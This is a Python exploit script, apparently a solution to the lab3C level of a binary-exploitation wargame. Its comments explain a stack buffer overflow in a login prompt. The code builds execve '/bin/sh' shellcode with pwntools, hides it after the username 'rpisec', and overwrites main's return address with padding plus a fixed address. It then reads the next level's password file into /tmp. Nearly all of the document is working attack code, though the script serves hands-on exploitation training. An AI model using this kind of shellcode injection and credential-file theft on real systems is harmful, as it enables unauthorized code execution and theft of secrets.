#!/usr/bin/python
# coding: utf-8


'''
Exploit for level lab3C
'''


import os
import pwn
import struct


#   Behaviour: The program first prompts the user for an admin username.
# Compares the input with "rpisec" and if it is equal, prompts the user for a
# password and compares it with "admin". If username and password are correct
# nothing happens.

#   Observations: The program uses two functions to validate the username and
# password. This two functions just compare the first 6 bytes in
# verify_user_name, and the first 5 bytes in verify_user_pass. The user name
# is stored in the .bss segment.

#   Exploitation: The program has a buffer overflow vulnerability: fgets can
# read up to 0x64 bytes and since the buffer starts at [esp+1c] with a stack
# size of 0x68 bytes. We can exploit this bug by overwriting the return
# address of main() and redirecting the program flow to our shellcode.
# There are various places to place our shellcode: the password buffer,
# environment variables, username buffer...
# I've decided to use the username buffer since it address is fixed and we
# won't need a NOP sled.


# First, we will assemble our shellcode
instructions = [
    'xor ecx, ecx',
    'mul ecx',
    'mov ebx, 0xb7f83a24',  # Pointer to "/bin/sh" (found with peda)
    'mov al, SYS_execve',
    'int 0x80'
    ]

shell = ''.join(map(pwn.asm, instructions))

# Then we place it in the username buffer. Note that we are taking advantage
# of the fact that verify_user_name only compares the first 6 characters. This
# means that we can place our shellcode after "rpisec" and the program won't
# notice
userbuf = 'rpisec' + shell

# Finally, we have to craft the password buffer to overwrite the return address
# propertly
retaddr = struct.pack('<I', 0x8049c46)  # Username buffer + 6
passbuf = 'admin' + 'A'*(0x68-0x1c+4-5) + retaddr  # With 75 bytes of padding

# Ready to exploit!
cmd = 'python -c \'print "%s\\n%s"\'' % (userbuf, passbuf)
os.system('(%s; echo "cat /home/lab3B/.pass > /tmp/lab3B.pass") | ' % cmd +
          '/levels/lab03/lab3C')
print '[+] Password saved in /tmp/lab3B.pass'
